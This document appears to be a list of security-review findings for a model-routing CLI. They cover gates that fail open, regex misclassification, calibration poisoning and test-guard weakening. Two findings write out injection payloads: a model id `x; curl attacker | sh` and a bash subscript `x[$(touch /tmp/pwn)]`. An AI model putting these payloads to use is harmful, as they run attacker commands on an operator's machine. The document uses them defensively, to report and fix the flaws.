findings.description: _catalog_provider_maps swallows every exception from _find_project_root, the system catalog read and load_project_config (bare `except Exception`), builds maps from whatever survived, and caches that result under the project root for the life of the process. routes_to_agy under `cli-only` now depends on these maps; when a layer fails to load, the only rule left is the `gemini*` name prefix, so catalog-only Google models and aliases (`deep-research-pro`, `researcher`) are reported as not agy-routed. No log line is emitted on failure.
findings.failure_mode: A malformed or unreadable model-config.yaml / project config, or a packaging layout where `Path(__file__).parents[3]/defaults` does not exist, silently turns the agy opt-in gate fail-open for every catalog Google model, and the failed read is pinned in _CATALOG_PROVIDERS_CACHE until restart.
findings.suggested_fix: Log read failures at warning level; do not cache a result when any layer raised (or cache a sentinel with retry); and have routes_to_agy treat an unresolvable provider under `cli-only` as an explicit error rather than 'not google'. Add a test that feeds a corrupt YAML and asserts the gate does not fail open.

findings.cross_file_justification: loader.py's docstring declares routes_to_agy the Python twin of `.claude/scripts/lib/agy-gate-lib.sh` routes_to_agy with 'one rule for every reader'. The diff changes the Python rule from the `gemini*` name test to catalog provider resolution but does not touch the shell library, so the two gates no longer implement the same predicate.
findings.description: The Python gate now recognises catalog Google models (`deep-research-pro`, `researcher`) as agy-routed under `cli-only`; the shell gate that hooks and scripts source is not updated in this change and still applies the bare `gemini*` name rule.
findings.failure_mode: Shell-side callers of the agy gate let catalog Google models through un-gated under `cli-only` while cheval actually dispatches them through agy, so the opt-in check is bypassed for exactly the models R3 was meant to cover.
findings.suggested_fix: Update agy-gate-lib.sh in the same change to consult the generated catalog maps (generated-model-maps.sh is already produced from the same YAML), and add a parity test that runs the same model list through both implementations.

findings.description: catalog_provider_of returns the raw provider prefix of an alias target. An alias whose target is `gemini-headless:<model>` therefore resolves to provider `gemini-headless`, and routes_to_agy compares that only against `"google"`. The earlier by-name branch matches the literal `gemini-headless` token in the model string, not alias names, so an alias such as `researcher: gemini-headless:gemini-2.5-pro` is dispatched through agy in practice but routes_to_agy returns False in every headless mode, not just `cli-only`.
findings.failure_mode: agy opt-in gate silently bypassed for any aliased gemini-headless target; the model is sent through the agy CLI without the gate ever firing.
findings.suggested_fix: In routes_to_agy, resolve aliases before the by-name check, or treat `catalog_provider_of(m) == "gemini-headless"` as agy-routed in any mode (keeping `google` only under `cli-only`). Add a unit test with an alias pointing at a gemini-headless target.

findings.description: _calibrate_hint formats entry.model_id / head.model_id unquoted into _PROBE_COMMAND, and cmd_invoke prints the result to stderr prefixed with `run:` and embeds it in the `calibrate` field of the error JSON. Model ids originate in project config discovered by cwd walk, i.e. from whichever repository cheval is executed in.
findings.failure_mode: A model id such as `x; curl attacker | sh` checked into a project's model config becomes a copy-paste command injection against the operator, and any tooling that auto-executes the `calibrate` field runs it directly.
findings.suggested_fix: Wrap the model id with shlex.quote when building the hint (and quote the --transport value), and validate model ids against a strict character allow-list at config load time.

findings.description: The status regex `(?<![\d,.])(?:429|529)(?!\d|[,.]\d|\s*k?\s*tokens\b)` only excludes 429/529 when adjacent to digits, separators or 'tokens'. It still matches those digits embedded in alphanumeric tokens: request ids (`req_a529fz`), UUIDs (`5f429a1b-...`), hex hashes, file paths. Because ClaudeHeadlessAdapter now lets is_throttle_message win over is_context_limit_message, a genuine size verdict whose text carries such an id is reclassified as a throttle.
findings.failure_mode: Oversized payloads are retried and walked to the next voice (the exact case the D-1.1b arm exists to prevent), inflating provider spend and rate-limit pressure; error text is CLI/provider controlled and can include echoed prompt or tool output, so the misclassification is externally influenceable.
findings.suggested_fix: Anchor the status match to a status context, e.g. `(?<![\w,.])(?:429|529)(?!\w|[,.]\d|\s*k?\s*tokens\b)` or `(?:status|error|http)\W{0,3}(?:429|529)\b`, and add fixtures containing UUIDs and request ids alongside a context-limit statement.

findings.cross_file_justification: cheval.py cmd_invoke (diff-touched) records parse_context_limit output (observed_input_tokens, provider_limit) into the observed-ceiling store (_observed_store_path, observation_recorded) and refuses to walk; the broadened matcher in ceiling.py decides what feeds that store.
findings.description: is_context_limit_message now classifies on bare `~N tokens (limit M)` style numeric patterns (_RE_INPUT_ONLY, _RE_INPUT_PLUS_OUTPUT, _RE_CLI_TOKENS_LIMIT) with no marker word. Any CLI or provider error text containing such a pattern, including content echoed from the prompt or tool output, is treated as a provider size verdict and its numbers are persisted as calibration observations.
findings.failure_mode: Calibration-store poisoning: one crafted or coincidental error string lowers the recorded ceiling, after which every larger payload is refused with calibration_needed instead of being walked, until an operator re-probes.
findings.suggested_fix: Accept the bare numeric form only when the message also matches the CLI's known pre-flight shape (e.g. 'Prompt is too long' / 'the request is'), and sanity-check parsed numbers against the catalog ceiling (reject values far below it) before recording an observation.

findings.description: The new lookup interpolates the caller-supplied model string directly into bash array subscripts (`${MODEL_IDS[$1]:-$1}`, `${MODEL_PROVIDERS[$1]:-${MODEL_PROVIDERS[$id]:-}}`) after sourcing `generated-model-maps.sh`. Plain `${arr[key]}` expansion is injection-safe only for arrays declared with `declare -A`. If the generated file omits either name (for example no aliases emitted) or declares it indexed, bash treats the reference as an indexed array and evaluates the subscript arithmetically, so a model id like `x[$(cmd)]` executes `cmd`. The subshell discards stderr (`2>/dev/null`) and swallows source failures (`|| exit 0`), so nothing would surface. Model ids reach this path from `.loa.config.yaml` stage/model settings via `routes_to_agy` and the new `*)` branch of `provider_of` in `run-preflight.sh`. The code checks `-f "$maps"` and the bash version but never verifies the declared type of the arrays or the shape of the id.
findings.failure_mode: A repo-controlled or malformed model id reaches an arithmetic subscript context during preflight or gate checks and runs shell commands whenever the generated maps file does not declare both MODEL_IDS and MODEL_PROVIDERS as associative arrays.
findings.suggested_fix: Validate the id before any lookup, e.g. `[[ $m =~ ^[A-Za-z0-9][A-Za-z0-9._:/-]*$ ]] || return 0`, and inside the subshell assert that `declare -p MODEL_IDS` and `declare -p MODEL_PROVIDERS` both begin with `declare -A` before dereferencing (exit the subshell otherwise). Add a bats case feeding a hostile id (`'x[$(touch /tmp/pwn)]'`) against a maps file that lacks MODEL_IDS and assert nothing runs.

findings.cross_file_justification: The bash predicate is documented as the twin of `loa_cheval.config.loader.routes_to_agy` / `cheval._entry_routes_to_agy`, and `test_agy_opt_in_gate.py::test_routes_to_agy_matches_the_bash_rule` now asserts `deep-research-pro` and `researcher` are agy-routed under cli-only. When the bash side cannot read the maps it silently gives the opposite answer for exactly those ids.
findings.description: `agy_catalog_provider` falls back silently to the legacy `gemini*` name rule when `generated-model-maps.sh` is absent, fails to source, or bash is older than 4. Under `cli-only`, `routes_to_agy deep-research-pro` then returns 1 (not agy-routed) and `agy_route_planned` reports the route as planned even with `hounfour.headless.agy_opt_in` off, while cheval classifies the same hop as agy-routed and refuses it. This recreates the bash-versus-Python split that R3 set out to close, in the direction where preflight is more permissive than the runtime gate, and no warning is emitted.
findings.failure_mode: Preflight reports a Google catalog model as planned without the opt-in and cheval refuses it at runtime; the argv-exposure route is never flagged by preflight for those ids when the maps are unreadable.
findings.suggested_fix: When bash is 4 or newer and the maps file is missing or unsourceable, print a one-time warning to stderr and return a distinct status (e.g. 2) from `agy_catalog_provider` so `routes_to_agy` and `agy_route_planned` can report 'unresolvable' rather than 'planned'. Add a bats test that removes the maps file and asserts the warning and the non-planned result.

findings.description: The live-spend guard switched from a before/after comparison of the real host ledger `.run/model-invoke.jsonl` to checking only the file named by `LOA_MODELINV_LOG_PATH`. The new check is only as strong as every cheval invoke path honoring that variable; a path that still appends to the default ledger would now escape detection. The fixture also raises KeyError (a test error, not a clean assertion) if the `_isolate_ledgers` conftest fixture does not export the variable, and the module relies on `os` being imported, which the shown diff does not add. This guard exists to stop test payloads from being sent to a real provider.
findings.failure_mode: A live model call that escapes the fake in this module is no longer detected if cheval records it anywhere other than the tmp ledger, so test content could reach a real provider silently.
findings.suggested_fix: At fixture setup assert `LOA_MODELINV_LOG_PATH` is set and resolves under tmp_path, and assert via cheval's own ledger-path resolver that it will write there. Optionally retain a module-scoped size-delta check on the host ledger as a secondary signal with a message that names concurrent runs as a possible cause.

findings.trigger_anchor: CHANGELOG.md hunk: "unless a throttle marker is present: Bedrock's \"Too many tokens, please wait before trying again\" is a rate limit, retried then walked — one is_throttle_message() rule in routing/ceiling.py serves the adapter and the probe (r251-3)"
findings.cross_file_justification: The diff changes only documentation, but the CHANGELOG, migration doc and SDD hunks all document new runtime behaviour in loa_cheval/routing/ceiling.py (is_throttle_message) and the claude-headless adapter: a free-text marker found in the CLI diagnostic now overrides the PROVIDER_CONTEXT_LIMIT classification. The implementing code is outside the diff and could not be read in this session, so this is anchored on the documented contract.
findings.description: The headless adapter's context-limit verdict ("not walked, no breaker count", the rule that prevents an oversized payload from being re-sent to every fallback voice) is now overridden whenever a throttle phrase is present in the CLI diagnostic. The CHANGELOG also states that classification runs on the full diagnostic. A substring match over free text is a weaker signal than a structured error code: any diagnostic that happens to contain the phrase (a provider message embedded in a larger error, or prompt/tool content echoed into the CLI's output) would reclassify a genuine size rejection as a throttle. That path then retries and walks the identical payload to the next configured voice.
findings.failure_mode: A request correctly rejected by the CLI pre-flight for size is reclassified as a rate limit, retried, charged to the breaker, and forwarded unchanged to the next voice in the chain (possibly a different provider or the HTTP route). This defeats the not-walked safeguard and incurs the upload and spend it was designed to avoid; with attacker-shaped prompt content it is a cheap way to force fan-out of one oversized payload across every configured provider.
findings.suggested_fix: Classify throttles from the CLI's structured result (exit code, JSON error type such as Bedrock ThrottlingException, or an explicit HTTP 429) instead of a substring over the full diagnostic. If text matching must remain, restrict it to the CLI's own error line, require the context-limit signature to be absent before reclassifying, and add a test where the throttle phrase appears inside prompt-derived text and the verdict must stay PROVIDER_CONTEXT_LIMIT.

findings.cross_file_justification: The diff removes the probe's local _THROTTLE regex and calls loa_cheval.routing.ceiling.is_throttle_message, which is not in the diff. Per sprint.md the same function now also drives ClaudeHeadlessAdapter._raise_for_error (throttle wins -> RateLimitError, retried then route-walked). The precedence rule is therefore shared across the probe and the live adapter.
findings.description: The throttle-wins-over-context-limit rule was widened from the probe's narrow regex (throttl, please wait, status 429, rate limit, tokens per min) to a shared matcher that also accepts 'overloaded', 'too many requests', 'quota' and a 529 in status position. The matcher runs on free-form provider error text and is substring based. Any terminal context-limit message that happens to contain one of the new words (for example a provider wording like 'input exceeds the context quota') is classified as transient. In the probe that means a size rejection is retried on the TPM backoff schedule and the bisection reads an inconsistent result; in the headless adapter it means the request is retried and then walked to the next route, so a payload the operator pinned to one provider can be re-sent to a different provider without the operator seeing why. The function body could not be verified from the diff, so this is recorded as a hardening concern rather than a confirmed defect. Provider error text is not attacker controlled in normal operation, which keeps severity LOW.
findings.failure_mode: A terminal context-limit error carrying a throttle-like word is misclassified as a rate limit: the probe burns budget on pointless retries and may record a partial outcome, and the adapter silently fails over to an alternate route, sending the prompt to a provider the operator did not select.
findings.suggested_fix: In is_throttle_message, require either a status-position 429/529 or an explicit throttle phrase, and only accept bare 'quota' or 'overloaded' when paired with a rate or time word (per minute, rate, retry). Add negative cases to the probe-vs-adapter conformance test for context-limit strings that contain 'quota' and 'overloaded'. Have _raise_for_error log the matched throttle marker whenever it overrides a context marker so a route walk is auditable.
